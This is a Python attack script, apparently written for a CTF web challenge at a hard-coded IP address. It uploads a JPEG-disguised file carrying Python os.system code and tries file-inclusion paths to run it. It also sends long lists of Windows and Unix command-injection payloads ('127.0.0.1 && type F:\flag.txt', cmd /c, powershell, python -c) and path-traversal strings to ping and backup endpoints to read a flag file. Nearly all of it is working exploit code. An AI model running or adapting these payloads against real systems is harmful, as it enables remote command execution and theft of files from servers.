import requests
import re

requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
TIMEOUT = 15

session = requests.Session()
session.verify = False
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
})
session.proxies = {}


def print_section(title):
    print("\n" + "=" * 70)
    print(f"  {title}")
    print("=" * 70)


def test_file_include_exec():
    """测试文件包含执行Python代码"""
    print_section("1. 测试文件包含执行Python代码")
    
    include_url = f"{TARGET}/include"
    
    # 上传一个包含Python代码的文件
    upload_url = f"{TARGET}/upload"
    
    r = session.get(upload_url, timeout=TIMEOUT)
    csrf = re.search(r'name=["\']csrf["\']\s*value=["\']([^"\']+)["\']', r.text)
    csrf_token = csrf.group(1) if csrf else ""
    
    # 创建一个包含Python代码的JPG文件
    jpg_header = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xdb\x00\x43\x00\x03\x02\x02\x02\x02\x02\x03\x02\x02\x02\x03\x03\x03\x03\x04\x06\x04\x04\x04\x04\x04\x08\x06\x06\x05\x06\x09\x08\x0a\x0a\x09\x08\x09\x09\x0a\x0c\x0f\x0c\x0a\x0b\x0e\x0b\x09\x09"
    jpg_footer = b"\xff\xd9"
    
    python_code = b"__import__('os').system('type F:\\\\flag.txt')"
    payload = jpg_header + python_code + jpg_footer
    
    files = {"file": ("test_exec.jpg", payload, "image/jpeg")}
    r = session.post(upload_url, files=files, data={"csrf": csrf_token}, timeout=TIMEOUT)
    
    if "上传成功" in r.text:
        uploaded_name = re.search(r'/uploads/([^"]+)', r.text)
        if uploaded_name:
            filename = uploaded_name.group(1)
            print(f"\n  上传成功: /uploads/{filename}")
            
            # 尝试文件包含
            include_payloads = [
                f"uploads/{filename}",
                f"../uploads/{filename}",
                f"F:\\small peoject\\python-lab\\uploads\\{filename}",
                f"/uploads/{filename}",
                f"/F:\\small peoject\\python-lab\\uploads\\{filename}",
                # 尝试路径遍历
                f"..\\uploads\\{filename}",
                f"..\\\\uploads\\\\{filename}",
                f"..%5cuploads%5c{filename}",
                f"..%2fuploads%2f{filename}",
            ]
            
            for payload in include_payloads:
                try:
                    r = session.get(include_url, params={"page": payload}, timeout=TIMEOUT)
                    
                    if r.status_code == 200:
                        content = r.text[:800]
                        
                        print(f"\n  [{r.status_code}] ?page={payload}")
                        print(f"     内容: {content}")
                        
                        flag_match = re.search(r'flag\{[^}]+\}', content, re.IGNORECASE)
                        if flag_match:
                            print(f"\n     🚩 FLAG FOUND: {flag_match.group(0)}")
                            return
                            
                except Exception as e:
                    print(f"  错误: {e}")


def test_ping_deeper():
    """深入测试Ping命令执行"""
    print_section("2. 深入测试Ping命令执行")
    
    ping_url = f"{TARGET}/ping"
    
    # 根据提示，用户输入被拼进了系统命令
    # 让我尝试各种格式的命令注入
    
    ping_payloads = [
        # 尝试在Windows上使用不同的命令格式
        "127.0.0.1 && whoami",
        "127.0.0.1 && type F:\\flag.txt",
        "127.0.0.1 && type F:\\small peoject\\python-lab\\flag.txt",
        "127.0.0.1 | whoami",
        "127.0.0.1 | type F:\\flag.txt",
        "127.0.0.1 || whoami",
        "127.0.0.1 || type F:\\flag.txt",
        # 尝试使用cmd /c
        "127.0.0.1; cmd /c whoami",
        "127.0.0.1; cmd /c type F:\\flag.txt",
        "127.0.0.1; cmd/c whoami",
        "127.0.0.1; cmd/c type F:\\flag.txt",
        # 尝试使用powershell
        "127.0.0.1; powershell whoami",
        "127.0.0.1; powershell type F:\\flag.txt",
        "127.0.0.1; powershell Get-Content F:\\flag.txt",
        # 尝试不带IP直接执行命令
        ";whoami",
        ";type F:\\flag.txt",
        "&&whoami",
        "&&type F:\\flag.txt",
        "|whoami",
        "|type F:\\flag.txt",
        # 尝试使用反引号
        "`whoami`",
        "`type F:\\flag.txt`",
        # 尝试使用$(...)
        "$(whoami)",
        "$(type F:\\flag.txt)",
        # 尝试使用不同的命令分隔符
        "127.0.0.1,type F:\\flag.txt",
        "127.0.0.1`type F:\\flag.txt`",
        "127.0.0.1$(type F:\\flag.txt)",
        # 尝试编码
        "127.0.0.1%0Atype F:\\flag.txt",
        "127.0.0.1%0D%0Atype F:\\flag.txt",
        "127.0.0.1%09type F:\\flag.txt",
        # 尝试使用换行符
        "127.0.0.1\nwhoami",
        "127.0.0.1\ntype F:\\flag.txt",
        # 尝试使用不同的IP格式
        "localhost;type F:\\flag.txt",
        "127.1;type F:\\flag.txt",
        "0;type F:\\flag.txt",
        "0.0.0.0;type F:\\flag.txt",
        # 尝试使用十六进制编码
        "127.0.0.1;python -c \"import os;os.system('type F:\\\\flag.txt')\"",
        "127.0.0.1;python -c \"print(open('F:\\\\flag.txt').read())\"",
        # 尝试使用Python直接执行
        "127.0.0.1;python -c __import__('os').system('type F:\\\\flag.txt')",
    ]
    
    for payload in ping_payloads:
        try:
            r = session.get(ping_url, params={"host": payload}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                body_match = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
                if body_match:
                    body_content = body_match.group(1)
                    
                    if "Blocked" not in body_content:
                        # 检查是否有命令执行结果
                        if len(body_content) > 100 or ("whoami" in body_content.lower() and not "Blocked" in body_content):
                            print(f"\n  [{r.status_code}] ?host={payload}")
                            print(f"     响应: {body_content[:800]}")
                            
                            flag_match = re.search(r'flag\{[^}]+\}', body_content, re.IGNORECASE)
                            if flag_match:
                                print(f"\n     🚩 FLAG FOUND: {flag_match.group(0)}")
                                return
                                
        except Exception as e:
            pass


def test_backup_deeper():
    """深入测试Backup命令执行"""
    print_section("3. 深入测试Backup命令执行")
    
    backup_url = f"{TARGET}/backup"
    
    backup_payloads = [
        # 尝试命令注入
        "F:\\small peoject\\python-lab\\uploads;whoami",
        "F:\\small peoject\\python-lab\\uploads;type F:\\flag.txt",
        "F:\\small peoject\\python-lab\\uploads;type F:\\small peoject\\python-lab\\flag.txt",
        "F:\\small peoject\\python-lab\\uploads&&whoami",
        "F:\\small peoject\\python-lab\\uploads&&type F:\\flag.txt",
        "F:\\small peoject\\python-lab\\uploads|whoami",
        "F:\\small peoject\\python-lab\\uploads|type F:\\flag.txt",
        # 尝试使用cmd /c
        "F:\\small peoject\\python-lab\\uploads;cmd /c whoami",
        "F:\\small peoject\\python-lab\\uploads;cmd /c type F:\\flag.txt",
        # 尝试使用Python
        "F:\\small peoject\\python-lab\\uploads;python -c \"print(open('F:\\\\flag.txt').read())\"",
        # 尝试路径遍历
        "F:\\small peoject\\python-lab\\uploads\\..",
        "F:\\small peoject\\python-lab\\uploads/..",
        "F:\\small peoject\\python-lab\\uploads\\..\\..",
        "F:\\small peoject\\python-lab\\uploads/../../",
        # 尝试读取根目录
        "F:\\",
        "C:\\",
        # 尝试读取其他目录
        "F:\\small peoject",
        "F:\\small peoject\\python-lab",
    ]
    
    for payload in backup_payloads:
        try:
            r = session.get(backup_url, params={"path": payload}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                body_match = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
                if body_match:
                    body_content = body_match.group(1)
                    
                    if "Blocked" not in body_content and len(body_content) > 20:
                        print(f"\n  [{r.status_code}] ?path={payload}")
                        print(f"     响应: {body_content[:800]}")
                        
                        flag_match = re.search(r'flag\{[^}]+\}', body_content, re.IGNORECASE)
                        if flag_match:
                            print(f"\n     🚩 FLAG FOUND: {flag_match.group(0)}")
                            return
                            
        except Exception as e:
            pass


def main():
    print("*" * 70)
    print("  CTF漏洞深度测试")
    print("  目标: " + TARGET)
    print("*" * 70)
    
    test_file_include_exec()
    test_ping_deeper()
    test_backup_deeper()
    
    print_section("测试完成")


if __name__ == "__main__":
    main()